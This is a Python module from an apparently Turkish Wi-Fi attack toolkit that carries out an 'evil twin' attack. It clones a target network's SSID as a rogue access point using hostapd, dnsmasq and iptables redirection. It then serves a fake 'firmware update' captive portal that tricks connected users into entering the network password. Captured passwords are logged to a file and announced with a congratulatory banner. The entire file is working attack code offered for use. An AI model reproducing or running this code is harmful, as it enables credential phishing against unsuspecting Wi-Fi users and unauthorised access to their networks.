import os
import subprocess
import time
import threading
from modules import radar, i18n
t = i18n.t
def cleanup():
    print(t("eviltwin_cleanup"))
    subprocess.run(["sudo", "killall", "hostapd", "dnsmasq"], capture_output=True)
    for f in ["/tmp/hostapd.conf", "/tmp/dnsmasq.conf"]:
        try: os.remove(f)
        except: pass
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"], capture_output=True)
    subprocess.run(["sudo", "iptables", "-F"], capture_output=True)
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"], capture_output=True)
    subprocess.run(["sudo", "systemctl", "start", "NetworkManager"], capture_output=True)
    subprocess.run(["sudo", "nmcli", "networking", "on"], capture_output=True)
    print(t("eviltwin_cleanup_done"))


# --- CAPTIVE PORTAL (Kimlik Doğrulama Sayfası) ---
def launch_flask_portal(ssid):
    portal_code = f"""
from flask import Flask, request, render_template_string, redirect
import os
app = Flask(__name__)
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ ssid }} - Firmware Güncellemesi</title>
    <style>
        body {{ font-family: -apple-system, system-ui, sans-serif; background: #f4f6f8; margin: 0; padding: 20px; text-align: center; color: #333; }}
        .container {{ background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); max-width: 400px; margin: 50px auto; }}
        h2 {{ color: #d32f2f; }}
        input {{ width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }}
        button {{ background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 16px; }}
        button:hover {{ background: #0056b3; }}
        .footer {{ margin-top: 20px; font-size: 12px; color: #777; }}
    </style>
</head>
<body>
    <div class="container">
        <h2>{{ t('portal_h2') }}</h2>
        <p>{{ t('portal_p1') }}</p>
        <p>{{ t('portal_p2', ssid=ssid) }}</p>
        <form method="POST" action="/verify">
            <input type="password" name="password" placeholder="{{ t('portal_placeholder') }}" required minlength="8">
            <button type="submit">{{ t('portal_button') }}</button>
        </form>
        <div class="footer">{{ t('portal_footer') }}</div>
    </div>
</body>
</html>
'''
@app.route("/", defaults={{"path": ""}})
@app.route("/<path:path>")
def catch_all(path):
    # Apple/Android captive portal check
    user_agent = request.headers.get('User-Agent', '').lower()
    if 'captive' in user_agent or 'apple' in user_agent or 'safari' in user_agent:
        return render_template_string(HTML_TEMPLATE, ssid="{ssid}")
    # If not explicitly captured, redirect to portal page anyway
    if path != "portal":
        return redirect("/portal")
    return render_template_string(HTML_TEMPLATE, ssid="{ssid}")
@app.route("/verify", methods=["POST"])
def verify():
    pwd = request.form.get("password")
    if pwd:
        # Şifre bulundu!
        with open("/tmp/HACKED_CREDS.txt", "a") as f:
            f.write(f"SSID: {ssid} | PASSWORD: {{pwd}}\\n")
        print(t("eviltwin_congrats") + f" {{pwd}}\n")
        return f"<h1>{{t('portal_success_title')}}</h1><p>{{t('portal_success_p')}}</p>"
    return "Error"
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80, debug=False)
"""
    with open("/tmp/flask_portal.py", "w") as f:
        f.write(portal_code)
    print(t("eviltwin_portal_starting"))
    subprocess.run(["sudo", "fuser", "-k", "80/tcp"], capture_output=True)
    return subprocess.Popen(["sudo", "python3", "/tmp/flask_portal.py"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


# --- ROUGE AP SETUP (Sahte Erişim Noktası) ---
def start_evil_twin(iface, ssid, channel):
    ssid = radar.clean_ssid(ssid)
    print(t("eviltwin_prep", ssid=ssid))
    cleanup()
    subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"])
    subprocess.run(["sudo", "killall", "wpa_supplicant"], capture_output=True)
    subprocess.run(["sudo", "rfkill", "unblock", "wifi"])
    time.sleep(1)
    subprocess.run(["sudo", "ifconfig", iface, "down"])
    subprocess.run(["sudo", "iwconfig", iface, "mode", "managed"], capture_output=True)
    subprocess.run(["sudo", "ifconfig", iface, "10.0.0.1", "netmask", "255.255.255.0", "up"])
    subprocess.run(["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"])
    subprocess.run(["sudo", "iptables", "-F"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-F"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--dport", "80", "-j", "DNAT", "--to-destination", "10.0.0.1:80"])
    subprocess.run(["sudo", "iptables", "-t", "nat", "-A", "POSTROUTING", "-j", "MASQUERADE"])
    try:
        if int(channel) > 14:
            channel = "6"
    except:
        channel = "6"
    hostapd_conf = f"""interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    with open("/tmp/hostapd.conf", "w") as f:
        f.write(hostapd_conf)
    dnsmasq_conf = f"""interface={iface}
bind-interfaces
server=8.8.8.8
domain-needed
bogus-priv
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
"""
    with open("/tmp/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)
    print(t("eviltwin_ap_starting"))
    ap_proc = subprocess.Popen(["hostapd", "/tmp/hostapd.conf"], stdout=open("/tmp/hostapd.log", "w"), stderr=subprocess.STDOUT)
    time.sleep(3)
    color_yellow = '\033[93m'
    color_end = '\033[0m'
    print(f"\n    {color_yellow}[HOSTAPD BAŞLATMA LOGLARI]{color_end}")
    try:
        if os.path.exists("/tmp/hostapd.log"):
            with open("/tmp/hostapd.log", "r") as logf:
                lines = logf.readlines()[:5]
                for line in lines:
                    print(f"        {line.strip()}")
    except: pass
    print(f"    {color_yellow}{'-'*30}{color_end}\n")
    if ap_proc.poll() is not None:
        print(t("eviltwin_ap_error"))
        print(t("eviltwin_ap_error_desc"))
        cleanup()
        return
    print(t("eviltwin_dns_starting"))
    dns_proc = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq.conf", "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(2)
    flask_proc = launch_flask_portal(ssid)
    try: os.remove("/tmp/HACKED_CREDS.txt")
    except: pass
    print(t("eviltwin_active"))
    print(t("eviltwin_active_ssid", ssid=ssid))
    print(t("eviltwin_active_hint"))
    print(t("eviltwin_stop_hint"))
    try:
        while True:
            time.sleep(1)
            if os.path.exists("/tmp/HACKED_CREDS.txt"):
                with open("/tmp/HACKED_CREDS.txt", "r") as f:
                    content = f.read()
                    print(f"\n\n\033[91m{'='*50}\033[0m")
                    print(f"\033[1m\033[92m[!!!] TEBRİKLER, ŞİFRE YAKALANDI!\033[0m")
                    print(f"\033[93m{content.strip()}\033[0m")
                    print(f"\033[91m{'='*50}\033[0m")
                try: os.remove("/tmp/HACKED_CREDS.txt")
                except: pass
                print(t("eviltwin_victim_exit"))
                time.sleep(3)
                break
    except KeyboardInterrupt:
        print(t("eviltwin_cancel"))
    finally:
        flask_proc.terminate()
        ap_proc.terminate()
        dns_proc.terminate()
        cleanup()
